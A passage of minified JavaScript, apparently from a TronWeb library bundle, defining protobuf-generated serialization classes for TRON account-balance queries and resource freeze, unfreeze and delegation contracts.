                balance: e.Message.getFieldWithDefault(s, 1, 0),
                placeholder: e.Message.getFieldWithDefault(s, 99, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.AccountTrace.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.AccountTrace;
            return TronWebProto.AccountTrace.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.AccountTrace.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readInt64();
                    n.setBalance(l);
                    break;
                case 99:
                    var l = s.readInt64();
                    n.setPlaceholder(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.AccountTrace.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.AccountTrace.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.AccountTrace.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getBalance(),
            a !== 0 && s.writeInt64(1, a),
            a = n.getPlaceholder(),
            a !== 0 && s.writeInt64(99, a)
        }
        ,
        TronWebProto.AccountTrace.prototype.getBalance = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.AccountTrace.prototype.setBalance = function(n) {
            return e.Message.setProto3IntField(this, 1, n)
        }
        ,
        TronWebProto.AccountTrace.prototype.getPlaceholder = function() {
            return e.Message.getFieldWithDefault(this, 99, 0)
        }
        ,
        TronWebProto.AccountTrace.prototype.setPlaceholder = function(n) {
            return e.Message.setProto3IntField(this, 99, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountIdentifier.prototype.toObject = function(n) {
            return TronWebProto.AccountIdentifier.toObject(n, this)
        }
        ,
        TronWebProto.AccountIdentifier.toObject = function(n, s) {
            var a = {
                address: s.getAddress_asB64()
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.AccountIdentifier.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.AccountIdentifier;
            return TronWebProto.AccountIdentifier.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.AccountIdentifier.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setAddress(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.AccountIdentifier.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.AccountIdentifier.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.AccountIdentifier.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a)
        }
        ,
        TronWebProto.AccountIdentifier.prototype.getAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.AccountIdentifier.prototype.getAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getAddress())
        }
        ,
        TronWebProto.AccountIdentifier.prototype.getAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getAddress())
        }
        ,
        TronWebProto.AccountIdentifier.prototype.setAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountBalanceRequest.prototype.toObject = function(n) {
            return TronWebProto.AccountBalanceRequest.toObject(n, this)
        }
        ,
        TronWebProto.AccountBalanceRequest.toObject = function(n, s) {
            var a, l = {
                accountIdentifier: (a = s.getAccountIdentifier()) && TronWebProto.AccountIdentifier.toObject(n, a),
                blockIdentifier: (a = s.getBlockIdentifier()) && TronWebProto.BlockBalanceTrace.BlockIdentifier.toObject(n, a)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.AccountBalanceRequest.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.AccountBalanceRequest;
            return TronWebProto.AccountBalanceRequest.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.AccountBalanceRequest.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = new TronWebProto.AccountIdentifier;
                    s.readMessage(l, TronWebProto.AccountIdentifier.deserializeBinaryFromReader),
                    n.setAccountIdentifier(l);
                    break;
                case 2:
                    var l = new TronWebProto.BlockBalanceTrace.BlockIdentifier;
                    s.readMessage(l, TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinaryFromReader),
                    n.setBlockIdentifier(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.AccountBalanceRequest.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.AccountBalanceRequest.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.AccountBalanceRequest.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getAccountIdentifier(),
            a != null && s.writeMessage(1, a, TronWebProto.AccountIdentifier.serializeBinaryToWriter),
            a = n.getBlockIdentifier(),
            a != null && s.writeMessage(2, a, TronWebProto.BlockBalanceTrace.BlockIdentifier.serializeBinaryToWriter)
        }
        ,
        TronWebProto.AccountBalanceRequest.prototype.getAccountIdentifier = function() {
            return e.Message.getWrapperField(this, TronWebProto.AccountIdentifier, 1)
        }
        ,
        TronWebProto.AccountBalanceRequest.prototype.setAccountIdentifier = function(n) {
            return e.Message.setWrapperField(this, 1, n)
        }
        ,
        TronWebProto.AccountBalanceRequest.prototype.clearAccountIdentifier = function() {
            return this.setAccountIdentifier(void 0)
        }
        ,
        TronWebProto.AccountBalanceRequest.prototype.hasAccountIdentifier = function() {
            return e.Message.getField(this, 1) != null
        }
        ,
        TronWebProto.AccountBalanceRequest.prototype.getBlockIdentifier = function() {
            return e.Message.getWrapperField(this, TronWebProto.BlockBalanceTrace.BlockIdentifier, 2)
        }
        ,
        TronWebProto.AccountBalanceRequest.prototype.setBlockIdentifier = function(n) {
            return e.Message.setWrapperField(this, 2, n)
        }
        ,
        TronWebProto.AccountBalanceRequest.prototype.clearBlockIdentifier = function() {
            return this.setBlockIdentifier(void 0)
        }
        ,
        TronWebProto.AccountBalanceRequest.prototype.hasBlockIdentifier = function() {
            return e.Message.getField(this, 2) != null
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.AccountBalanceResponse.prototype.toObject = function(n) {
            return TronWebProto.AccountBalanceResponse.toObject(n, this)
        }
        ,
        TronWebProto.AccountBalanceResponse.toObject = function(n, s) {
            var a, l = {
                balance: e.Message.getFieldWithDefault(s, 1, 0),
                blockIdentifier: (a = s.getBlockIdentifier()) && TronWebProto.BlockBalanceTrace.BlockIdentifier.toObject(n, a)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.AccountBalanceResponse.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.AccountBalanceResponse;
            return TronWebProto.AccountBalanceResponse.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.AccountBalanceResponse.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readInt64();
                    n.setBalance(l);
                    break;
                case 2:
                    var l = new TronWebProto.BlockBalanceTrace.BlockIdentifier;
                    s.readMessage(l, TronWebProto.BlockBalanceTrace.BlockIdentifier.deserializeBinaryFromReader),
                    n.setBlockIdentifier(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.AccountBalanceResponse.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.AccountBalanceResponse.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.AccountBalanceResponse.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getBalance(),
            a !== 0 && s.writeInt64(1, a),
            a = n.getBlockIdentifier(),
            a != null && s.writeMessage(2, a, TronWebProto.BlockBalanceTrace.BlockIdentifier.serializeBinaryToWriter)
        }
        ,
        TronWebProto.AccountBalanceResponse.prototype.getBalance = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.AccountBalanceResponse.prototype.setBalance = function(n) {
            return e.Message.setProto3IntField(this, 1, n)
        }
        ,
        TronWebProto.AccountBalanceResponse.prototype.getBlockIdentifier = function() {
            return e.Message.getWrapperField(this, TronWebProto.BlockBalanceTrace.BlockIdentifier, 2)
        }
        ,
        TronWebProto.AccountBalanceResponse.prototype.setBlockIdentifier = function(n) {
            return e.Message.setWrapperField(this, 2, n)
        }
        ,
        TronWebProto.AccountBalanceResponse.prototype.clearBlockIdentifier = function() {
            return this.setBlockIdentifier(void 0)
        }
        ,
        TronWebProto.AccountBalanceResponse.prototype.hasBlockIdentifier = function() {
            return e.Message.getField(this, 2) != null
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.FreezeBalanceV2Contract.prototype.toObject = function(n) {
            return TronWebProto.FreezeBalanceV2Contract.toObject(n, this)
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                frozenBalance: e.Message.getFieldWithDefault(s, 2, 0),
                resource: e.Message.getFieldWithDefault(s, 3, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.FreezeBalanceV2Contract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.FreezeBalanceV2Contract;
            return TronWebProto.FreezeBalanceV2Contract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = s.readInt64();
                    n.setFrozenBalance(l);
                    break;
                case 3:
                    var l = s.readEnum();
                    n.setResource(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.FreezeBalanceV2Contract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getFrozenBalance(),
            a !== 0 && s.writeInt64(2, a),
            a = n.getResource(),
            a !== 0 && s.writeEnum(3, a)
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.prototype.getFrozenBalance = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.prototype.setFrozenBalance = function(n) {
            return e.Message.setProto3IntField(this, 2, n)
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.prototype.getResource = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.FreezeBalanceV2Contract.prototype.setResource = function(n) {
            return e.Message.setProto3EnumField(this, 3, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.UnfreezeBalanceV2Contract.prototype.toObject = function(n) {
            return TronWebProto.UnfreezeBalanceV2Contract.toObject(n, this)
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                unfreezeBalance: e.Message.getFieldWithDefault(s, 2, 0),
                resource: e.Message.getFieldWithDefault(s, 3, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.UnfreezeBalanceV2Contract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.UnfreezeBalanceV2Contract;
            return TronWebProto.UnfreezeBalanceV2Contract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = s.readInt64();
                    n.setUnfreezeBalance(l);
                    break;
                case 3:
                    var l = s.readEnum();
                    n.setResource(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.UnfreezeBalanceV2Contract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getUnfreezeBalance(),
            a !== 0 && s.writeInt64(2, a),
            a = n.getResource(),
            a !== 0 && s.writeEnum(3, a)
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.prototype.getUnfreezeBalance = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.prototype.setUnfreezeBalance = function(n) {
            return e.Message.setProto3IntField(this, 2, n)
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.prototype.getResource = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.UnfreezeBalanceV2Contract.prototype.setResource = function(n) {
            return e.Message.setProto3EnumField(this, 3, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.WithdrawExpireUnfreezeContract.prototype.toObject = function(n) {
            return TronWebProto.WithdrawExpireUnfreezeContract.toObject(n, this)
        }
        ,
        TronWebProto.WithdrawExpireUnfreezeContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64()
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.WithdrawExpireUnfreezeContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.WithdrawExpireUnfreezeContract;
            return TronWebProto.WithdrawExpireUnfreezeContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.WithdrawExpireUnfreezeContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.WithdrawExpireUnfreezeContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.WithdrawExpireUnfreezeContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.WithdrawExpireUnfreezeContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a)
        }
        ,
        TronWebProto.WithdrawExpireUnfreezeContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.WithdrawExpireUnfreezeContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.WithdrawExpireUnfreezeContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.WithdrawExpireUnfreezeContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.DelegateResourceContract.prototype.toObject = function(n) {
            return TronWebProto.DelegateResourceContract.toObject(n, this)
        }
        ,
        TronWebProto.DelegateResourceContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                resource: e.Message.getFieldWithDefault(s, 2, 0),
                balance: e.Message.getFieldWithDefault(s, 3, 0),
                receiverAddress: s.getReceiverAddress_asB64(),
                lock: e.Message.getBooleanFieldWithDefault(s, 5, !1),
                lockPeriod: e.Message.getFieldWithDefault(s, 6, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.DelegateResourceContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.DelegateResourceContract;
            return TronWebProto.DelegateResourceContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.DelegateResourceContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = s.readEnum();
                    n.setResource(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setBalance(l);
                    break;
                case 4:
                    var l = s.readBytes();
                    n.setReceiverAddress(l);
                    break;
                case 5:
                    var l = s.readBool();
                    n.setLock(l);
                    break;
                case 6:
                    var l = s.readInt64();
                    n.setLockPeriod(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.DelegateResourceContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.DelegateResourceContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getResource(),
            a !== 0 && s.writeEnum(2, a),
            a = n.getBalance(),
            a !== 0 && s.writeInt64(3, a),
            a = n.getReceiverAddress_asU8(),
            a.length > 0 && s.writeBytes(4, a),
            a = n.getLock(),
            a && s.writeBool(5, a),
            a = n.getLockPeriod(),
            a !== 0 && s.writeInt64(6, a)
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.getResource = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.setResource = function(n) {
            return e.Message.setProto3EnumField(this, 2, n)
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.getBalance = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.setBalance = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.getReceiverAddress = function() {
            return e.Message.getFieldWithDefault(this, 4, "")
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.getReceiverAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getReceiverAddress())
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.getReceiverAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getReceiverAddress())
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.setReceiverAddress = function(n) {
            return e.Message.setProto3BytesField(this, 4, n)
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.getLock = function() {
            return e.Message.getBooleanFieldWithDefault(this, 5, !1)
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.setLock = function(n) {
            return e.Message.setProto3BooleanField(this, 5, n)
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.getLockPeriod = function() {
            return e.Message.getFieldWithDefault(this, 6, 0)
        }
        ,
        TronWebProto.DelegateResourceContract.prototype.setLockPeriod = function(n) {
            return e.Message.setProto3IntField(this, 6, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.UnDelegateResourceContract.prototype.toObject = function(n) {
            return TronWebProto.UnDelegateResourceContract.toObject(n, this)
        }
        ,
        TronWebProto.UnDelegateResourceContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                resource: e.Message.getFieldWithDefault(s, 2, 0),
                balance: e.Message.getFieldWithDefault(s, 3, 0),
                receiverAddress: s.getReceiverAddress_asB64()
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.UnDelegateResourceContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.UnDelegateResourceContract;
            return TronWebProto.UnDelegateResourceContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.UnDelegateResourceContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = s.readEnum();
                    n.setResource(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setBalance(l);
                    break;
                case 4:
                    var l = s.readBytes();
                    n.setReceiverAddress(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.UnDelegateResourceContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.UnDelegateResourceContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getResource(),
            a !== 0 && s.writeEnum(2, a),
            a = n.getBalance(),
            a !== 0 && s.writeInt64(3, a),
            a = n.getReceiverAddress_asU8(),
            a.length > 0 && s.writeBytes(4, a)
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.getResource = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.setResource = function(n) {
            return e.Message.setProto3EnumField(this, 2, n)
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.getBalance = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.setBalance = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.getReceiverAddress = function() {
            return e.Message.getFieldWithDefault(this, 4, "")
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.getReceiverAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getReceiverAddress())
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.getReceiverAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getReceiverAddress())
        }
        ,
        TronWebProto.UnDelegateResourceContract.prototype.setReceiverAddress = function(n) {
            return e.Message.setProto3BytesField(this, 4, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.CancelAllUnfreezeV2Contract.prototype.toObject = function(n) {
            return TronWebProto.CancelAllUnfreezeV2Contract.toObject(n, this)
        }
        ,
        TronWebProto.CancelAllUnfreezeV2Contract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64()
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.CancelAllUnfreezeV2Contract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.CancelAllUnfreezeV2Contract;
            return TronWebProto.CancelAllUnfreezeV2Contract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.CancelAllUnfreezeV2Contract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.CancelAllUnfreezeV2Contract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.CancelAllUnfreezeV2Contract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.CancelAllUnfreezeV2Contract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a)
        }
        ,
        TronWebProto.CancelAllUnfreezeV2Contract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.CancelAllUnfreezeV2Contract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.CancelAllUnfreezeV2Contract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.CancelAllUnfreezeV2Contract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        t.object.extend(r, TronWebProto)
    }(HT)),
    HT
}
Cge();
var KT = {}, gW;
function Sge() {
    return gW || (gW = 1,
    function(r) {
        var e = ys()
          , t = e
          , o = typeof globalThis < "u" && globalThis || typeof window < "u" && window || typeof o < "u" && o || typeof self < "u" && self || (function() {
            return this
        }
        ).call(null) || Function("return this")();
        t.exportSymbol("TronWebProto.AssetIssueContract", null, o),
        t.exportSymbol("TronWebProto.AssetIssueContract.FrozenSupply", null, o),
        t.exportSymbol("TronWebProto.ParticipateAssetIssueContract", null, o),
        t.exportSymbol("TronWebProto.TransferAssetContract", null, o),
        t.exportSymbol("TronWebProto.UnfreezeAssetContract", null, o),
        t.exportSymbol("TronWebProto.UpdateAssetContract", null, o),
        TronWebProto.AssetIssueContract = function(i) {
            e.Message.initialize(this, i, 0, -1, TronWebProto.AssetIssueContract.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.AssetIssueContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.AssetIssueContract.displayName = "TronWebProto.AssetIssueContract"),
        TronWebProto.AssetIssueContract.FrozenSupply = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.AssetIssueContract.FrozenSupply, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.AssetIssueContract.FrozenSupply.displayName = "TronWebProto.AssetIssueContract.FrozenSupply"),
        TronWebProto.TransferAssetContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.TransferAssetContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.TransferAssetContract.displayName = "TronWebProto.TransferAssetContract"),
        TronWebProto.UnfreezeAssetContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.UnfreezeAssetContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.UnfreezeAssetContract.displayName = "TronWebProto.UnfreezeAssetContract"),
        TronWebProto.UpdateAssetContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.UpdateAssetContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.UpdateAssetContract.displayName = "TronWebProto.UpdateAssetContract"),
        TronWebProto.ParticipateAssetIssueContract = function(i) {
